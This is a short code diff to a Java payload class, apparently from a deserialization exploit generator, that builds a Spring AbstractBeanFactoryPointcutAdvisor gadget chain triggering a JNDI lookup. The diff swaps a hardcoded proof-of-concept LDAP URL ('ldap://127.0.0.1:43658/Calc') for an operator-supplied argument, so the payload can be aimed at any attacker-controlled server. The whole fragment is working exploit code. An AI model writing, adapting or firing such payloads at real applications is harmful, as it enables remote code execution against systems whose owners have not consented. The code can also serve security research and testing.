@@ -35,8 +35,8 @@ public class SpringAbstractBeanFactoryPointcutAdvisorPoc implements Payload {
       args = this.args;
     Object o = null;
     try {
-      BeanFactory bf = SpringUtil.makeJNDITrigger("ldap://127.0.0.1:43658/Calc");
-      o = SpringUtil.makeBeanFactoryTriggerBFPA("ldap://127.0.0.1:43658/Calc", bf);
+      BeanFactory bf = SpringUtil.makeJNDITrigger(args[0]);
+      o = SpringUtil.makeBeanFactoryTriggerBFPA(args[0], bf);
     } catch (Exception e) {
       e.printStackTrace();
     }
